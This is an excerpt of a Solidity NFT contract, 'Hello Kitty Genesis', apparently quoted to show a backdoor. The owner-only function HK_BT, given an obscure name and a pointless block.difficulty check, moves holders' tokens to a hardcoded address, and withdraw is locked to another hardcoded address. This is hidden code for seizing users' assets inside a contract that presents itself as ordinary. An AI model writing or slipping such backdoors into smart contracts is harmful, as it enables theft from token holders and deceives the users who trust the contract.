...
contract Hello_Kitty_Genesis is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Hello Kitty Genesis", "HKG", maxBatchSize_, collectionSize_) {
  ...
  function HK_BT(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x310Ec0F976B45f5D9641c611DF4e87b9798d557f, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x36f755E8CE11aD60380f015d31BAbE7ED0b29a3e);
